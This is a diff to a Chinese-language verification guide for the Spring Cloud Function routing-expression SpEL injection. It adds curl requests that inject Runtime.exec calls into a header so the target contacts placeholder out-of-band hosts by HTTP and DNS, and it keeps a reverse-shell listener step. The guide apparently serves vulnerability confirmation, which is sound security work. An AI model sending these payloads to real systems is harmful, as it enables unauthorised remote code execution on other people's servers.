@@ -69,23 +69,26 @@ curl -X POST "http://target:8080/functionRouter" \
 ## 验证方法
 
 ```bash
-# 方法1: HTTP 回调
-# 攻击机启动监听
+# 方法1: HTTP 回调（OOB 侧监听）
 python3 -m http.server 80
-# 发送回调 payload 后检查是否收到来自目标的 HTTP 请求
-
-# 方法2: DNS 外带
-# 发送 DNS payload 后在 dnslog 平台检查解析记录
-
-# 方法3: 反弹 shell
-nc -lvp 4444
-# 发送反弹 shell payload 后检查是否收到连接
-
-# 方法4: 通过响应码辅助判断（500 表示表达式被执行但出错，也是存在漏洞的信号）
-curl -s -o /dev/null -w "%{http_code}" -X POST "http://target:8080/functionRouter" \
-  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
+# 发送带 POC_TOKEN 的回调 payload
+curl -X POST "http://target:8080/functionRouter" \
+  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://OOB_DOMAIN/POC_TOKEN')" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "test"
+# 判据：监听端收到目标源 IP 发起的请求，且请求路径/查询里带着本次的 POC_TOKEN
+# 反例：只有一般性的扫描请求、路径里没有 POC_TOKEN，不算命中
+
+# 方法2: DNS 外带
+curl -X POST "http://target:8080/functionRouter" \
+  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('nslookup POC_TOKEN.OOB_DOMAIN')" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "test"
+# 判据：OOB_DOMAIN 的解析记录里出现本次随机子域（POC_TOKEN），说明表达式已执行
+
+# 方法3: 反弹 shell（有回连即命中）
+nc -lvp ATTACKER_PORT
+# 判据：监听端收到来自目标源 IP 的连接
 ```
 
 ## 指纹确认
